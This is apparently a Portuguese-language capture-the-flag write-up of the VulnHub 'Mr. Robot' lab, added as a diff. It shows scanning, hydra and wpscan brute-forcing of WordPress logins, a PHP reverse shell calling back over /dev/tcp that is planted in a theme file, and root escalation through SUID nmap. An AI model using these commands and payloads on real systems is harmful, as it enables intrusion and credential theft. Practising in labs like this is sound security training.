@@ -1,0 +1,287 @@
+IP: 192.168.0.28
+
+PORT    STATE  SERVICE  VERSION
+22/tcp  closed ssh
+80/tcp  open   http     Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+443/tcp open   ssl/http Apache httpd
+|_http-server-header: Apache
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=www.example.com
+| Not valid before: 2015-09-16T10:45:03
+|_Not valid after:  2025-09-13T10:45:03
+MAC Address: 08:00:27:AA:78:12 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 3.X|4.X
+OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+OS details: Linux 3.10 - 4.11
+Network Distance: 1 hop
+
+Robot.txt:
+http://192.168.0.28/robots.txt
+
+Wordlis:
+http://192.168.0.28/fsocity.dic
+
+Wordlist salvo em:
+fsociety.dic
+
+Key 1 de 3:
+http://192.168.0.28/key-1-of-3.txt
+
+Aceita POST Request:
+http://192.168.0.28/xmlrpc.php
+XML-RPC server accepts POST requests only.
+
+Wordpress:
+Version: 4.3.24
+Twenty Fifteen v1.3
+
+Tentiva de Brute Force (sem sucesso):
+hydra -L lists/usrname.txt -P lists/pass.txt localhost -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+hydra -l admin -P fsociety.dic 192.168.0.28 -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+
+Nikto:
++ Server: Apache
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ Retrieved x-powered-by header: PHP/5.5.29
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Uncommon header 'tcn' found, with contents: list
++ Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. See http://www.wisec.it/sectou.php?id=4698ebdc59d15. The following alternatives for 'index' were found: index.html, index.php
++ OSVDB-3092: /admin/: This might be interesting...
++ Uncommon header 'link' found, with contents: <http://192.168.0.28/?p=23>; rel=shortlink
++ /wp-links-opml.php: This WordPress script reveals the installed version.
++ OSVDB-3092: /license.txt: License file found may identify site software.
++ /admin/index.html: Admin login page/section found.
++ Cookie wordpress_test_cookie created without the httponly flag
++ /wp-login/: Admin login page/section found.
++ /wordpress: A Wordpress installation was found.
++ /wp-admin/wp-login.php: Wordpress login found
++ /wordpresswp-admin/wp-login.php: Wordpress login found
++ /blog/wp-login.php: Wordpress login found
++ /wp-login.php: Wordpress login found
++ /wordpresswp-login.php: Wordpress login found
++ 7915 requests: 0 error(s) and 18 item(s) reported on remote host
++ End Time:           2020-10-26 12:25:05 (GMT-4) (432 seconds)
+
+XML:
+http://192.168.0.28//wp-links-opml.php
+<opml version="1.0">
+<head>
+<title>Links for user's Blog!</title>
+<dateCreated>Mon, 26 Oct 2020 16:34:13 GMT</dateCreated>
+<!--  generator="WordPress/4.3.24"  -->
+</head>
+<body> </body>
+</opml>
+
+Padrão de autenticação do Wordpress:
+Por padrão no wordpress, se digitar o usuário e a senha invalidos, vai apresentar a mensagem de que o usuário é invalido,
+Mas se digitar o usuário correto e a senha invalida, vai apresentar a mensagem de que a senha do usuário 'xxx' está invalida,
+com isso, podemos constatar que o usuário está correto.
+
+Com ajuda do Burp Suite peguei os parametros que serao usados no Hydra:
+POST /wp-login.php HTTP/1.1
+Host: 192.168.0.28
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://192.168.0.28/wp-login
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 101
+Connection: close
+Cookie: s_fid=72AC06D11082F55B-0A5E90476CBF35F8; s_nr=1603715707351; wordpress_test_cookie=WP+Cookie+check
+Upgrade-Insecure-Requests: 1
+
+log=admin&pwd=admin&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.0.28%2Fwp-admin%2F&testcookie=1
+
+ERROR: Invalid username.
+
+Print dos parametros do wp-login no Burp Suite, salvos no diretório.
+
+Fazemos um brute force para descobrir/validar quem e o usuario do wordpress:
+sudo hydra -V -L fsocity.dic -p test 192.168.0.28 http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid Username'
+[80][http-post-form] host: 192.168.0.28   login: Elliot   password: test
+
+Testamos o usuário e 'Elliot' e a senha test no página de login 'http://192.168.0.28/wp-login.php' e confirmamos que o usuário está correto.
+
+Agora que temos o usuário, faremos um brute-force com o wpscan para tentar descobrir a senha dele:
+wpscan --url http://192.168.0.28 -U usuario.txt -P /home/kali/TryJao/OSCP-Vulnhub/mrrobot/fsocity.dic
+
+cat usuario.txt
+Elliot
+
+Encontrado a senha, depois de 3 horas executando brute force:
+[+] Performing password attack on Xmlrpc Multicall against 1 user/s
+Progress Time: 02:10:57 <=======================================================================================================> (1716 / 1716) 100.00% Time: 02:10:57
+WARNING: Your progress bar is currently at 1716 out of 1716 and cannot be incremented. In v2.0.0 this will become a ProgressBar::InvalidProgressError.                
+Progress Time: 02:10:58 <=======================================================================================================> (1716 / 1716) 100.00% Time: 02:10:58
+[SUCCESS] - Elliot / ER28-0652                                                                                                                                        
+All Found                                                                                                                                                             
+
+Autentiquei no Wordpress com as credenciais encontradas no brute force.
+
+Dentro da console de administrador do Wordpress, aparência, editor, 404.php, adicionamos um reverse webshell.
+Configuramos um nc em modo listening e para fazer a conexão de shell reverso, executamos a url 'http://192.168.0.28/qualquercoisa'.
+Com isso temo um shell no alvo.
+Salvo print da configuração do reverse webshell no wordpress.
+
+cat wpshell.php 
+<?php
+//Reverse WebShell - 404.php
+exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.29/443 0>&1'");
+?>
+
+nc -vnlp 443
+listening on [any] 443 ...
+connect to [192.168.0.29] from (UNKNOWN) [192.168.0.28] 41609
+bash: cannot set terminal process group (1509): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ id
+id
+uid=1(daemon) gid=1(daemon) groups=1(daemon)
+
+Encontramos a flag 2 de 3, mas não está acessível, não temos permissão de acesso.
+daemon@linux:/home/robot$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+cat: key-2-of-3.txt: Permission denied
+
+Mas encontramos um arquivo de texto, com a senha do usuário 'robot' em hash MD5:
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+Efetuado a decryptação do MD5 com ferramentas online e retornou o resultado:
+c3fcd3d76192e4007dfb496cca67e13b:abcdefghijklmnopqrstuvwxyz
+
+Mesmo assim não consegui acessar com o 'sudo' ou 'su', mesmo se tivesse acesso, não conseguiria, pois o usuário robot, não tem um shell bash:
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+sshd:x:102:65534::/var/run/sshd:/usr/sbin/nologin
+ftp:x:103:106:ftp daemon,,,:/srv/ftp:/bin/false
+bitnamiftp:x:1000:1000::/opt/bitnami/apps:/bin/bitnami_ftp_false
+mysql:x:1001:1001::/home/mysql:
+varnish:x:999:999::/home/varnish:
+robot:x:1002:1002::/home/robot:
+
+Efetuado a escalação de privilégios lateral para acessar o usuário 'robot', através do shell '/bin/sh', acessado pelo Python PTY:
+nc -vnlp 443
+listening on [any] 443 ...
+connect to [192.168.0.17] from (UNKNOWN) [192.168.0.28] 36113
+bash: cannot set terminal process group (1509): Inappropriate ioctl for device
+bash: no job control in this shell
+daemon@linux:/opt/bitnami/apps/wordpress/htdocs$ cd /home/
+cd /home/
+daemon@linux:/home$ ls
+ls
+robot
+daemon@linux:/home$ cd robot
+cd robot
+daemon@linux:/home/robot$ 
+daemon@linux:/home/robot$ su robot
+su robot
+su: must be run from a terminal
+daemon@linux:/home/robot$ python -c 'import pty; pty.spawn("/bin/sh")'
+python -c 'import pty; pty.spawn("/bin/sh")'
+$ 
+$ su robot
+su robot
+Password: abcdefghijklmnopqrstuvwxyz
+robot@linux:~$ 
+robot@linux:~$ ls
+ls
+key-2-of-3.txt  password.raw-md5
+
+Capturado a flag 2 de 3:
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+robot@linux:~$ 
+
+Efetuado a escalação de privilégios vertical para acesso root:
+
+Identificado que o 'nmap' tem permissão de execução de root.
+robot@linux:~$ find / -perm -4000 -type f 2> /dev/null
+find / -perm -4000 -type f 2> /dev/null
+/bin/ping
+/bin/umount
+/bin/mount
+/bin/ping6
+/bin/su
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/chsh
+/usr/bin/chfn
+/usr/bin/gpasswd
+/usr/bin/sudo
+/usr/local/bin/nmap
+/usr/lib/openssh/ssh-keysign
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper
+/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper
+/usr/lib/pt_chown
+robot@linux:~$ 
+
+Obtemos o acesso de 'root', através do nmap interativo.
+robot@linux:~$ nmap --interactive
+nmap --interactive
+
+Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
+Welcome to Interactive Mode -- press h <enter> for help
+nmap> !sh 
+!sh
+# id
+id
+uid=1002(robot) gid=1002(robot) euid=0(root) groups=0(root),1002(robot)
+# whoami
+whoami
+root
+# cd /root
+cd /root
+# ls
+ls
+firstboot_done  key-3-of-3.txt
+# cat key-3-of-3.txt
+
+Com isso, obtive a chave 3 de 3:
+cat key-3-of-3.txt
+04787ddef27c3dee1ee161b21670b4e4
+# 
+
+
+
+
+Referencias:
+https://www.vulnhub.com/entry/mr-robot-1,151/
+https://securitybytes.io/vulnhub-com-mr-robot-1-ctf-walkthrough-7d4800fc605a
+https://nwrzd.medium.com/vulnhub-com-mr-robot-1-walkthrough-5119586b2a3f
+https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-mr-robot/
+https://www.youtube.com/watch?v=9hzf2zW5nVQ
+https://blog.wpscan.com/wpscan/2019/09/17/wpscan-brute-force.html
+https://www.hackingtutorials.org/web-application-hacking/hack-a-wordpress-website-with-wpscan/
+https://linuxconfig.org/test-wordpress-logins-with-hydra-on-kali-linux
+
+
+
